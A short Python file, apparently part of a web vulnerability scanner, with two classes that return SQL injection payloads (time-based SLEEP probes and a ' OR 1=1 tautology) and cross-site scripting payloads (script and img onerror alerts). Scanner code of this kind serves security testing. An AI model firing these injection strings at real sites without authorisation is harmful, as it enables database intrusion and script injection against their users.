class VectorSQLi:
    def name(self): return "SQLi"
    def payloads(self, nexus):
        return ["1' OR SLEEP(5)-- -", "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", "' OR 1=1--"]

class VectorXSS:
    def name(self): return "XSS"
    def payloads(self, nexus):
        return ["<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>"]
